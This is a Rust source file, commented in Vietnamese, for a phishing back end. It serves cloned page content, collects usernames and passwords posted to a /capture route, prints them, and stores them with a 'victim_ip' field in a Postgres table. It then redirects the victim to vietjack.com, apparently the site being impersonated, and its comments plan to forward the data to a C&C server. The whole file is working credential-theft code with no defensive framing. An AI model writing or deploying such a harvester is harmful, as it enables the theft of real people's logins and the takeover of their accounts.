// File: src/main.rs

use axum::{
    extract::{Form, State}, // Thêm State để inject database pool
    routing::{get_service, post},
    response::{Redirect, IntoResponse},
    http::StatusCode,
    Router,
    serve,
};
use tower_http::services::ServeDir;
use std::net::SocketAddr;
use tokio::net::TcpListener;

// Dùng cho việc lưu file cũ (có thể xóa sau khi chuyển sang DB)
// use std::fs::OpenOptions;
// use std::io::Write;

// Thêm imports cho database
use sqlx::{postgres::PgPoolOptions, Pool, Postgres};
use dotenv::dotenv; // Để đọc file .env
use std::env; // Để lấy biến môi trường
use uuid::Uuid; // Để tạo UUID
use chrono::Utc; // Để lấy thời gian hiện tại

use serde::Deserialize;

#[derive(Deserialize)]
struct LoginForm {
    username: String,
    password: String,
}

// Struct lưu trữ trạng thái chia sẻ của ứng dụng, bao gồm database pool
#[derive(Clone)] // Cần derive Clone để có thể chia sẻ giữa các handler
struct AppState {
    db_pool: Pool<Postgres>,
    // Có thể thêm các trạng thái khác ở đây nếu cần
    // c_c_client: reqwest::Client, // Sẽ thêm sau cho việc gửi đến C&C
}

#[tokio::main]
async fn main() {
    // Đọc biến môi trường từ file .env
    dotenv().ok();

    // Lấy DATABASE_URL từ biến môi trường
    let database_url = env::var("DATABASE_URL")
        .expect("Thiếu biến môi trường DATABASE_URL. Vui lòng cấu hình file .env");

    // Kết nối đến database và tạo pool
    let db_pool = PgPoolOptions::new()
        .max_connections(5) // Số kết nối tối đa trong pool
        .connect(&database_url)
        .await
        .expect("Không thể kết nối đến database");

    // Chạy migrations để tạo bảng nếu chưa có
    sqlx::migrate!("./migrations")
        .run(&db_pool)
        .await
        .expect("Lỗi khi chạy database migrations");

    println!("Database migrations chạy thành công!");

    // Tạo trạng thái chia sẻ cho ứng dụng
    let app_state = AppState { db_pool };

    // Xây dựng ứng dụng web bằng Axum Router
    let app = Router::new()
        .nest_service(
            "/", // Gắn ServeDir service vào gốc ("/")
            ServeDir::new("content").append_index_html_on_directories(true)
        )
        // Route để xử lý request POST từ form đăng nhập, truyền trạng thái db_pool
        .route("/capture", post(capture_credentials_handler))
        // Thêm trạng thái vào router để các handler có thể truy cập
        .with_state(app_state); // <-- Gắn trạng thái app_state vào router

    let addr = SocketAddr::from(([127, 0, 0, 1], 3000));
    println!("Server đang chạy tại http://{}", addr);

    // Tạo listener và chạy server
    let listener = TcpListener::bind(&addr).await.unwrap();
    serve(listener, app).await.unwrap();
}

// Chỉnh sửa handler để nhận State và lưu vào database
async fn capture_credentials_handler(
    State(state): State<AppState>, // Nhận State chứa db_pool
    // axum::extract::ConnectInfo<SocketAddr> (Nếu muốn lấy IP)
    // axum::extract::Extension<header::HeaderMap> (Nếu muốn lấy User-Agent)
    Form(credentials): Form<LoginForm>
) -> impl axum::response::IntoResponse {
    println!("Đã thu thập thông tin đăng nhập:");
    println!("Username: {}", credentials.username);
    println!("Password: {}", credentials.password);

    // Lấy IP Address và User-Agent (ví dụ đơn giản)
    // Để lấy IP chính xác, bạn cần cấu hình Axum với ConnectInfo và chạy listener với `axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>())`
    // Và handler sẽ nhận thêm `axum::extract::ConnectInfo(addr): axum::extract::ConnectInfo<SocketAddr>`.
    // Để lấy User-Agent, cần Extension<header::HeaderMap> và layer tương ứng.
    let victim_ip = "N/A".to_string(); // Placeholder
    let user_agent = "N/A".to_string(); // Placeholder
    let captured_at = Utc::now();
    let id = Uuid::new_v4();

    // Lưu thông tin vào database
    let result = sqlx::query!(
        r#"
        INSERT INTO credentials (id, username, password, victim_ip, user_agent, captured_at)
        VALUES ($1, $2, $3, $4, $5, $6)
        "#,
        id,
        credentials.username,
        credentials.password,
        victim_ip,
        user_agent,
        captured_at
    )
    .execute(&state.db_pool) // Thực thi query trên database pool
    .await;

    match result {
        Ok(_) => println!("Đã lưu thông tin đăng nhập vào database"),
        Err(e) => eprintln!("Lỗi khi lưu thông tin vào database: {}", e),
    }

    // Phần gửi đến C&C server sẽ thêm vào đây sau...

    // Trả về phản hồi cho nạn nhân (ví dụ: Redirect)
    let redirect_url = "https://www.vietjack.com/";
    println!("Redirecting to: {}", redirect_url);
    Redirect::to(redirect_url).into_response()
}